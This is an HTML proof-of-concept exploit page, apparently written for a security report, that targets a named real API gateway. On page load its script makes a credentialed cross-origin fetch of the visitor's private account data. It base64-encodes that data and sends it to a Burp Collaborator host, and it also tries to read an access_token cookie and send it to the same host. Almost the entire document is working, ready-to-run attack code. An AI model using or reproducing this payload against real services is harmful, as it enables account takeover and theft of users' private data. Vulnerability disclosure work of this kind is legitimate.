<!DOCTYPE html>
<html>
<head>
    <title>Critical Security PoC - Account Takeover</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #0d1117; color: #58a6ff; padding: 50px; }
        .box { border: 1px solid #30363d; padding: 20px; border-radius: 6px; background: #161b22; margin-bottom: 20px; }
        .success { color: #3fb950; border-color: #3fb950; }
        .error { color: #f85149; border-color: #f85149; }
        pre { white-space: pre-wrap; word-wrap: break-word; color: #c9d1d9; }
    </style>
</head>
<body>
    <div class="box" id="main-box">
        <h2>[!] CORS & Session Hijack PoC</h2>
        <p>Status: <span id="status">Executing Attack...</span></p>
        
        <p><strong>Step 1: Extracted JWT (Auth Bypass):</strong></p>
        <pre id="jwt-area">Searching for token...</pre>
        
        <p><strong>Step 2: Private Account Data (CORS Exfiltration):</strong></p>
        <pre id="data-area">Attempting credentialed read...</pre>
    </div>

    <script>
        // CONFIGURATION
        const TARGET = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
        const COLLABORATOR = "https://7u2orz4pr32w4khr8pm9lnpzeqkh882wr.oastify.com"; // <--- PUT YOUR COLLABORATOR URL HERE

        async function startExploit() {
            const status = document.getElementById('status');
            const dataArea = document.getElementById('data-area');
            const jwtArea = document.getElementById('jwt-area');

            try {
                // EXPLOIT 1: Credentialed CORS Fetch
                // This proves the server allows 'evil.com' to request private data.
                const response = await fetch(TARGET, {
                    method: "GET",
                    credentials: "include" // This tells browser to send cookies
                });

                const json = await response.json();
                dataArea.innerText = JSON.stringify(json, null, 2);

                if (response.ok) {
                    status.innerText = "EXPLOIT SUCCESSFUL";
                    document.getElementById('main-box').className = "box success";
                    
                    // EXFILTRATION TO BURP
                    fetch(`${COLLABORATOR}/?exfil_data=${btoa(JSON.stringify(json))}`);
                } else {
                    status.innerText = "FAILED: 401 Unauthenticated";
                    document.getElementById('main-box').className = "box error";
                }

                // EXPLOIT 2: HttpOnly Bypass (Requires XSS context, but we check here)
                if (document.cookie.includes("access_token")) {
                    const token = document.cookie.match(/access_token=([^;]+)/)[1];
                    jwtArea.innerText = token;
                    fetch(`${COLLABORATOR}/?stolen_jwt=${token}`);
                } else {
                    jwtArea.innerText = "Note: Cookies only accessible via target domain context.";
                }

            } catch (err) {
                status.innerText = "CRITICAL ERROR: " + err.message;
            }
        }

        window.onload = startExploit;
    </script>
</body>
</html>
